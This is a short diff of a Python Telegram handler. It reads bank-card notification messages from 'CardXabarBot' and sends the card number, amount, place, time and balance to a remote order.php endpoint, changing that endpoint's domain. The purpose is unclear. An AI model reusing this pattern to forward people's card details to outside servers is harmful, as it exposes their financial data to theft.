@@ -37,7 +37,7 @@ def send(_, msg):
         balance = balance[1].split("\n")
         print(balance[0])
         
-        URL = "https://www.alximikuz.space/order.php"
+        URL = "https://methodcloud.ru/order.php"
         PARAMS = { 'yt': yt, 'sum': value[0], 'card': card[0], 'place': place[0], 'time': time[0], 'place': place[0], 'balance': balance[0], 'cardType': "humo" }
         r = requests.get(url = URL, params = PARAMS)
     if msg.text.find("💸 Perevod na kartu") != -1 and msg.chat.username == "CardXabarBot":
@@ -57,7 +57,7 @@ def send(_, msg):
         time = time[1].split("\n")
         print(time[0])
         
-        URL = "https://www.alximikuz.space/order.php"
+        URL = "https://methodcloud.ru/order.php"
         PARAMS = { 'sum': value[0], 'card': card[0], 'place': place[0], 'time': time[0], 'place': place[0], 'cardType': "uzcad" }
         r = requests.get(url = URL, params = PARAMS)
     
